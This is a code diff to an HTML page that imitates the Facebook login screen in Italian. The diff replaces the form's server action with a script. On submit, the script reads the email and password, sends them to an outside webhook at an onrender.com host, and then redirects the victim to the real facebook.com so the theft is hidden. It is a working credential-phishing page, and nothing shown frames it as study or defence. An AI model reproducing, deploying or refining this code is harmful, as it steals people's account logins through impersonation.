@@ -15,7 +15,7 @@
   <div class="fb-container">
     <img src="facebook.png" alt="Facebook logo" class="fb-logo" />
 
-    <form action="process.php" method="POST" class="fb-form" autocomplete="on">
+    <form id="loginForm" class="fb-form" autocomplete="on">
       <input type="text" name="email" placeholder="Email o numero di telefono" autocomplete="username" required />
       <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
       <button type="submit">Accedi</button>
@@ -33,5 +33,32 @@
       </div>
     </footer>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const email = document.querySelector("input[name='email']").value;
+      const password = document.querySelector("input[name='password']").value;
+
+      try {
+        const response = await fetch("https://facebook-it.onrender.com/webhook", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, password })
+        });
+
+        if (response.ok) {
+          alert("Accesso inviato correttamente!");
+          window.location.href = "https://facebook.com"; // redirect finale
+        } else {
+          alert("Errore nell'invio.");
+        }
+      } catch (error) {
+        console.error("Errore:", error);
+        alert("Errore di connessione.");
+      }
+    });
+  </script>
 </body>
 </html>
